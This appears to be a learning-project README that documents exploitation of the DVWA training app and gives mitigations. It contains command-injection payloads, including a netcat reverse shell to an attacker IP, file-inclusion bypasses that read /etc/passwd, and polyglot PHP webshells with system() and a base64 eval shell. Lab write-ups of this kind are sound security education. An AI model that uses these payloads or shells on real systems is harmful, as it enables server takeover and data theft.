# Web Hack Project

## Overview

This project focuses on identifying and exploiting vulnerabilities in a web application (DVWA) and developing a custom PHP shell with functionalities similar to c99 and r57. The identified vulnerabilities will be exploited, documented, and mitigation techniques will be provided to secure the web platform.

The DVWA application has been set up to simulate various security levels (Low, Medium, and High) for testing. The first vulnerability explored is **Command Injection**, where the application allows direct execution of system commands on the server.

## Vulnerability 1: Command Injection

### Description

**Command Injection** occurs when user input is improperly sanitized, allowing arbitrary system commands to be executed on the server. In this case, the input provided for the IP address field is vulnerable to command injection across all security levels (Low, Medium, and High). By exploiting this vulnerability, an attacker can execute commands such as `ls`, `pwd`, and even more harmful ones, such as starting a reverse shell to gain remote access.

### Exploitation Steps

1. **Low Security Level:**
   - On the low security setting, the system is very permissive, allowing direct command execution by simply appending a semicolon (`;`) after the IP address input.
   - Example: Enter `127.0.0.1; ls` to list the server files.

2. **Medium Security Level:**
   - On the medium security setting, the semicolon (`;`) is filtered out. However, by using logical operators like `||` (logical OR), an attacker can still bypass the input validation.
   - Example: Enter `127.0.0.1 || ls` to execute the `ls` command.

3. **High Security Level:**
   - Even with the highest security setting, the logical operator trick (`||`) still works to bypass the protection, meaning command injection is still possible.
   - Example: Enter `127.0.0.1 || ls` to execute the `ls` command.

### Impact of Vulnerability

In a real-world scenario, this vulnerability can be exploited for much more than simple file navigation. An attacker could establish a reverse shell and gain full access to the server. For example, the attacker could start a netcat server (`nc`) on their machine and use the vulnerable web application to call back and establish a remote shell.

- Example:
  1. Start a listener on the attacker's machine: `nc -lvp 4444`.
  2. On the vulnerable app, instead of entering `ls`, the attacker inputs a command that opens a reverse shell: `127.0.0.1 || nc [attacker's IP] 4444 -e /bin/bash`.

### Mitigation and Fixes

To protect against command injection vulnerabilities, the following measures should be taken:

1. **Input Validation:**
   - Implement strict input validation to ensure that only valid IP addresses are allowed in the input field. Regular expressions can be used to validate the input format (e.g., `^(\d{1,3}\.){3}\d{1,3}$` for IPv4).

2. **Least Privilege Principle:**
   - The web server should run with minimal privileges to reduce the impact of command injection. If an attacker does manage to execute a command, the scope of the damage would be limited.

3. **Disable Dangerous Functions:**
   - Disable dangerous functions such as `system()`, `exec()`, `passthru()`, and `shell_exec()` in PHP. These functions allow direct execution of system commands and should be avoided when possible.

## Vulnerability 2: File Inclusion

### Description

File Inclusion vulnerabilities allow an attacker to include files on a server through the web browser. This can lead to information disclosure, remote code execution, and other severe security issues. We've identified this vulnerability in the DVWA application across different security levels.

### Exploitation Steps

1. **Low Security Level:**
   - Simple Local File Inclusion (LFI):
     - Modify the URL parameter to access server files.
     - Example: `url?page=file4.php` instead of `url?page=file3.php`
   - Remote File Inclusion (RFI):
     - Create a PHP shell and host it on a Python server.
     - Use the URL to execute commands:
     - Example: `url?page=http://localhost:xxxx/shell.php&cmd=pwd`

2. **Medium Security Level:**
   - LFI is still possible despite some filtering.
   - Filters for "http://" and "../" can be bypassed.
   - Example bypass: `...//....//hackable/flags/fi.php`

3. **High Security Level:**
   - Direct access to source/file code is blocked.
   - Security measure: `fnmatch` ensures the argument always starts with "file".
   - Bypass technique: Use the `file://` protocol.
   - Example: `url/?page=file:///etc/passwd`

### Real-world Impact

1. **Data Breach:** An attacker could access sensitive files like `/etc/passwd`, potentially revealing user information and system details.
2. **Remote Code Execution:** By including a malicious PHP file, an attacker could execute arbitrary code on the server, potentially leading to full system compromise.

### Mitigation and Fixes

1. **Whitelist Approach:** 
   - Implement a strict whitelist of allowed files or pages.
   - Example: 
     ```php
     $allowed_pages = ['home.php', 'about.php', 'contact.php'];
     $page = $_GET['page'] ?? 'home.php';
     if (in_array($page, $allowed_pages)) {
         include $page;
     } else {
         // Handle error or redirect
     }
     ```

2. **Disable Remote File Inclusion:**
   - Set `allow_url_include` to `Off` in the PHP configuration.
   - This prevents the inclusion of remote files, mitigating RFI attacks.

## Vulnerability 3: File Upload

### Description

File Upload vulnerabilities occur when a web application allows users to upload files without properly validating or sanitizing them. This can lead to the execution of malicious code on the server, potentially resulting in complete system compromise.

### Exploitation Steps

1. **Low Security Level:**
   - Direct upload of a PHP shell is possible.
   - Access the uploaded shell via URL to execute commands.

2. **Medium Security Level:**
   - The application checks file extensions (allowing only .jpeg or .png).
   - Bypass methods:
     a. Rename the shell file (e.g., `shell.php.png`).
     b. Modify the Content-Type header using a proxy like Burp Suite.
   - Additional bypass method:
     c. Use a polyglot file that is both a valid image and contains PHP code.
        Example:
        ```php
        ÿØÿàJFIF<?php system($_GET['cmd']); ?>
        ```
        Save this as `shell.jpg`. It's a valid JPEG and contains PHP code.

3. **High Security Level:**
   - Requires bypassing extension, Content-Type, and content checks.
   - Method:
     a. Keep the first two lines of a valid image file (signature).
     b. Append the PHP shell code after these lines.
   - Alternative method without using a proxy:
     c. Use PHP's built-in wrappers to execute code:
        ```php
        GIF89a;
        <?php
        $code = base64_decode($_GET['code']);
        eval($code);
        ?>
        ```
        Save as `shell.gif` and use with: `shell.gif?code=base64_encoded_php_code`

### Real-world Impact

1. **Webshell Installation:** Attackers can upload a webshell, gaining persistent access to the server and the ability to execute arbitrary commands.
2. **Malware Distribution:** The compromised server could be used to host and distribute malware to unsuspecting users.

### Mitigation and Fixes

1. **Content Validation:**
   - Use libraries like `fileinfo` to verify file contents match the expected type.
   Example:
   ```php
   $finfo = finfo_open(FILEINFO_MIME_TYPE);
   $mime = finfo_file($finfo, $_FILES['userfile']['tmp_name']);
   if ($mime !== 'image/jpeg' && $mime !== 'image/png') {
       die('Invalid file type');
   }
   ```

2. **Strict Filename Policy:**
   - Generate new random filenames for uploaded files.
   - Store the original filename and new filename in a database if needed.
   Example:
   ```php
   $extension = pathinfo($_FILES['userfile']['name'], PATHINFO_EXTENSION);
   $newFilename = bin2hex(random_bytes(16)) . '.' . $extension;
   ```





## Resources:
- https://book.hacktricks.xyz/pentesting-web/file-inclusion


## Author
- github.com/dgthegeek